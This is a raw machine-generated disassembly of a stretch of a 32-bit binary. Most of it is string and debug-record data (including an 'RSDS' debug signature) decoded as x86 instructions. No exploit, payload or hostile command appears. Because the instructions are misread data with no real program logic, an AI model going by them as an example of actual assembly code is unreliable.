  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	inc    ecx
  42ab59:	xchg   ebx,eax
  42ab5a:	inc    ebx
  42ab5b:	pop    esi
  42ab5c:	sub    BYTE PTR [edi+eax*1+0x4e],al
  42ab60:	mov    edx,0x6645d859
  42ab65:	test   bl,ah
  42ab67:	push   ebp
  42ab68:	sbb    al,0x0
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
